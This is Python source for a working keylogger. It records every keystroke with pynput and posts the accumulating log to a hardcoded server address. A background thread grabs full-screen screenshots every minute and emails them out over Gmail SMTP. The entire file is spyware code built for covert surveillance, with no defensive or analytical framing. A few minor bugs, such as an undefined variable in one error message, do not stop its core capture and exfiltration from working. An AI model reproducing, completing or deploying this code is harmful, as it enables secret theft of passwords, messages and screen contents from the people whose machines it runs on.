import os
import sys
import time
import smtplib
import random
import string
import requests
import threading

from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from sys import platform
from screeninfo import get_monitors
from PIL import ImageGrab
from datetime import datetime
from pynput import keyboard

SERVER_URL = "http://192.168.178.26:8080"

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.timestamp = ""
        self.current_generated_id = ""
  
    def save_image(self):
        ss_image = self._take_screenshot()
        ss_image.save(f"screenshot_{get_current_datetime()}.png", format='PNG')
        
       
        print('Image successfully saved locally')
        
    def on_press(self, key):
        
        if key == keyboard.Key.esc: # move out into a separate function
            sys.exit(0)
            return
        
        try:
            self.log = self.log + str(key.char)         
        except AttributeError:
            if key == key.space:
                self.log = self.log + ' '
            else:
                self.log = self.log + ' ' + str(key) + ' '
        result_str = f'User input: [{datetime.now()}] {self.log}'
        
        try:
            data = {
                "keystrokes": result_str,
        #        "image_data": img_str
            }
            
            post_response = requests.post(SERVER_URL, json=data)
            
            if post_response.status_code != 200:
                print(f"Failed to send keystroke: {response.status_code}")

        except Exception as e:
            print(f"\n An error occurred while sending keystroke: {e}")
    
    
    # this function needs to execute periodically
    
    def _take_screenshot(self):
        monitor = get_monitors()[0]
        width = monitor.width
        height = monitor.height
        ss_region = (0, 0, width, height)
        ss_image = ImageGrab.grab(ss_region)
        return ss_image
        
    def send_screenshot(self):
        while True:
    
            file_path = f'screenshot_{get_current_datetime()}.png'
            self.save_image()
            try:
        
                with open(file_path, "rb") as image_file:
                    img_data = image_file.read()
                    
                msg = MIMEMultipart()
                msg['Subject'] = 'screen_capture'
                msg['From'] = 'sender@sender.com'
                msg['To'] = 'receiver@receiver.com'            
                    
                text = MIMEText('screen_capture_test')
                msg.attach(text)
                    
                image = MIMEImage(img_data, name=os.path.basename(file_path))
                msg.attach(image)
                    
                s = smtplib.SMTP("smtp.gmail.com", 587)
                s.ehlo()
                s.starttls()
                s.login('sender@sender.com', '')
                s.sendmail(msg['From'], msg['To'], msg.as_string())
                s.quit()            
                    
            except Exception as e:
                print(f'An error occured: {e}')    
            time.sleep(60)
                    
def get_sys_platform():
    return platform
  
def get_current_datetime():
    return str(datetime.now().strftime("%Y-%m-%d-%H:%M"))

logger = KeyLogger()
print(get_sys_platform())


screenshot_thread = threading.Thread(target=logger.send_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()


with keyboard.Listener(on_press=logger.on_press) as listener:
    listener.join()
    